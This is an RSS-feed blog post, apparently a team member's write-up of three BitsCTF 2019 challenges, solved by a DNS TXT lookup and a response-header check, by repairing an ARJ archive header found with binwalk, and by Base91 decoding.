      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/bits/bitsthumb.png" title="banner" class="gallery-item"><img src="/img/bits/bitsthumb.png" alt="banner"></a></p><p>BitsCTF 2019 had somewhat medium and easy challs too.<br>At the end my team was finally able to secure a rank in the  Top 10 with 1745 pts.</p><p><a href="/img/bits/scorebits.png" class="gallery-item"><img src="/img/bits/scorebits.png"></a>   </p><hr><h1 id="EasyPoints-Web"><a href="#EasyPoints-Web" class="headerlink" title="EasyPoints (Web)"></a>EasyPoints (Web)</h1><p><a href="/img/bits/easythumb.png" class="gallery-item"><img src="/img/bits/easythumb.png"></a></p><p>As the challenge says to <strong>Look UP</strong>.<br>I quickly use <a href="https://mxtoolbox.com/">mxtool</a> to carry a txt record lookup.    </p><p><a href="/img/bits/easy1.png" class="gallery-item"><img src="/img/bits/easy1.png"></a></p><p>I found a base64 encoded string, Yip33 !!  </p><p><a href="/img/bits/easy2.png" class="gallery-item"><img src="/img/bits/easy2.png"></a>   </p><p>That was not enough :(</p><p><a href="/img/bits/easy3.png" class="gallery-item"><img src="/img/bits/easy3.png"></a></p><p>I moved on !! and observed the Response Headers.<br>One of them <strong>X-Flag</strong> contained the flag…</p><p><a href="/img/bits/easy4.png" class="gallery-item"><img src="/img/bits/easy4.png"></a></p><h1 id="SPIFFED-Forensics"><a href="#SPIFFED-Forensics" class="headerlink" title="SPIFFED (Forensics)"></a>SPIFFED (Forensics)</h1><p><a href="/img/bits/spiffthumb.png" class="gallery-item"><img src="/img/bits/spiffthumb.png"></a></p><p>I checked what type of file it was.. but sadly that didn’t help …<br>And I moved on with hexeditor , but nothing seemed interesting so I checked for some embedded files using binwalk and got the following output.</p><p><a href="/img/bits/spiff1.png" class="gallery-item"><img src="/img/bits/spiff1.png"></a>  </p><p>But wait I didn’t get the <em>_extracted</em> folder. I can smell the hardness of level now !!<br>I checked the headers if they were correct for the <strong>ARJ archieve data file</strong>.<br><a href="/img/bits/spiff2.png" class="gallery-item"><img src="/img/bits/spiff2.png"></a></p><p> And to my surprise it was wrong…</p><p><a href="/img/bits/spiff3.png" class="gallery-item"><img src="/img/bits/spiff3.png"></a></p><p> After correcting the header using hexeditor I navigated into the <strong>_extracted</strong> directory.  </p><p><a href="/img/bits/spiff4.png" class="gallery-item"><img src="/img/bits/spiff4.png"></a></p><p>And I observed that all files were containing some gibberish text.<br>After some tinkering around and decreasing my font size I got to see the FLAG ..</p><p>B00mYa!! Lets the drinks go on..</p><p><a href="/img/bits/spiff5.png" class="gallery-item"><img src="/img/bits/spiff5.png"></a></p><p>And the flag was <strong>BITSCTF{I_L0v3_D0g5_D0_Y0u??}</strong></p><h1 id="WhatAgain-Crypto"><a href="#WhatAgain-Crypto" class="headerlink" title="WhatAgain (Crypto)"></a>WhatAgain (Crypto)</h1><p><a href="/img/bits/cryptothumb.png" class="gallery-item"><img src="/img/bits/cryptothumb.png"></a>  </p><p>This task was completed by my teammate..<br>So all the credit goes to him :P</p><p>After struggling for a while to find what kind of encryption is it..<br>There were many discussions regarding this question XD</p><p>At last it was a simple Base91 encoded String !!!</p><p><a href="/img/bits/crypto1.png" class="gallery-item"><img src="/img/bits/crypto1.png"></a></p><p>We used Base91 Decoder from <a href="https://www.dcode.fr/base-91-encoding">dcode</a><br>and got flag as the Result. </p><p><a href="/img/bits/crypto2.png" class="gallery-item"><img src="/img/bits/crypto2.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/CTF-Writeups/">CTF Writeups</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/bitsctf/">bitsctf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/EasyPoints/">EasyPoints</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/WhatAgain/">WhatAgain</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/SPIFFED/">SPIFFED</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/ctf/">ctf</category>
      
      
      <comments>https://mrt4ntr4.github.io/Bits-CTF-Writeups/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
